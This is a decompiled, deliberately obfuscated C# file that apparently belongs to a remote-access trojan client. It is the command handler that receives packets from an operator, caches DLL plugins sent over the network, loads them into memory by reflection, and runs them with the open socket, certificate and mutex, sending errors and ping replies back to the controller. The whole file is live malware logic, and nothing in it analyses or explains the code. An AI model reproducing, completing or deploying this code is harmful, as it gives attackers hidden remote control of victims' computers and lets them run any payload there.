using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using FLyjDGiQaWOL;
using MlfWmjHrDtM;
using TSsgkAiksqQbUk;
using gxNMEqEgrijT;

namespace gDUxSbRqUN;

public static class tXsdFYrhAJnAoTF
{
	[CompilerGenerated]
	private static class QHMMUffbiXRpREi
	{
		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> LiCvUnMnRBui;
	}

	public static List<BkiLYFLOLaOffh> GRHrALIJNqO = new List<BkiLYFLOLaOffh>();

	public static void OtaNZkDUUNoDS(object lSPxFkBnQoSeYZ)
	{
		try
		{
			BkiLYFLOLaOffh bkiLYFLOLaOffh = new BkiLYFLOLaOffh();
			bkiLYFLOLaOffh.UBlyuHNEtFb((byte[])lSPxFkBnQoSeYZ);
			switch (bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Packet").NeEjgBfTnxsVX)
			{
			case "savePlugin":
				PjoqEoUcWIU.LXCwoVoTCBpwp(bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Hash").NeEjgBfTnxsVX, bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Dll").YyNRwQqHAHiY());
				{
					foreach (BkiLYFLOLaOffh item in GRHrALIJNqO.ToList())
					{
						if (item.bHZXfobBkouZxiwT("Dll").NeEjgBfTnxsVX == bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Hash").NeEjgBfTnxsVX)
						{
							ifPJOVaAgZWmv(item);
							GRHrALIJNqO.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (PjoqEoUcWIU.LhuGdihocg(bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Dll").NeEjgBfTnxsVX) == null)
					{
						GRHrALIJNqO.Add(bkiLYFLOLaOffh);
						BkiLYFLOLaOffh bkiLYFLOLaOffh3 = new BkiLYFLOLaOffh();
						bkiLYFLOLaOffh3.bHZXfobBkouZxiwT("Packet").MDUVhUbWiMDgI("sendPlugin");
						bkiLYFLOLaOffh3.bHZXfobBkouZxiwT("Hashes").MDUVhUbWiMDgI(bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Dll").NeEjgBfTnxsVX);
						MtisDSJUpyiKPK.wWjqfBHTJauC(bkiLYFLOLaOffh3.nBhKSGjtanPwf());
					}
					else
					{
						ifPJOVaAgZWmv(bkiLYFLOLaOffh);
					}
					break;
				}
				catch (Exception ex)
				{
					tyVAlXhLSrok(ex.Message);
					break;
				}
			case "pong":
			{
				MtisDSJUpyiKPK.SfBRntbYErncrmc = false;
				BkiLYFLOLaOffh bkiLYFLOLaOffh2 = new BkiLYFLOLaOffh();
				bkiLYFLOLaOffh2.bHZXfobBkouZxiwT("Packet").MDUVhUbWiMDgI("pong");
				bkiLYFLOLaOffh2.bHZXfobBkouZxiwT("Message").lHQeDPoKfFeByp(MtisDSJUpyiKPK.DpnekLZsFtZQc);
				MtisDSJUpyiKPK.wWjqfBHTJauC(bkiLYFLOLaOffh2.nBhKSGjtanPwf());
				MtisDSJUpyiKPK.DpnekLZsFtZQc = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			tyVAlXhLSrok(ex2.Message);
		}
	}

	private static void ifPJOVaAgZWmv(BkiLYFLOLaOffh nIcFQgyHmYOOGxCS)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(JHJqnZOmgeGMD.porHVDREaXWlJc(PjoqEoUcWIU.LhuGdihocg(nIcFQgyHmYOOGxCS.bHZXfobBkouZxiwT("Dll").NeEjgBfTnxsVX))).GetType("Plugin.Plugin"));
		val.Run(MtisDSJUpyiKPK.cKOKdPgbhQLCp, slKZMvijUhIUq.DxEbaqCtMcTfdYD, slKZMvijUhIUq.XzgMNqxRIl, nIcFQgyHmYOOGxCS.bHZXfobBkouZxiwT("Msgpack").YyNRwQqHAHiY(), FTdDLHrCdru.tzwUXoGTeDcN, slKZMvijUhIUq.RdHYeHbVSmsTWpC, slKZMvijUhIUq.jZHKrYGXBcfaT, slKZMvijUhIUq.ePTjApLdhYE);
		GxFwfsDezjH();
	}

	private static void GxFwfsDezjH()
	{
		BkiLYFLOLaOffh bkiLYFLOLaOffh = new BkiLYFLOLaOffh();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Packet").NeEjgBfTnxsVX = "Received";
		MtisDSJUpyiKPK.wWjqfBHTJauC(bkiLYFLOLaOffh.nBhKSGjtanPwf());
		Thread.Sleep(1000);
	}

	public static void tyVAlXhLSrok(string lEcRdPykItbjhdFUt)
	{
		BkiLYFLOLaOffh bkiLYFLOLaOffh = new BkiLYFLOLaOffh();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Packet").NeEjgBfTnxsVX = "Error";
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Error").NeEjgBfTnxsVX = lEcRdPykItbjhdFUt;
		MtisDSJUpyiKPK.wWjqfBHTJauC(bkiLYFLOLaOffh.nBhKSGjtanPwf());
	}
}
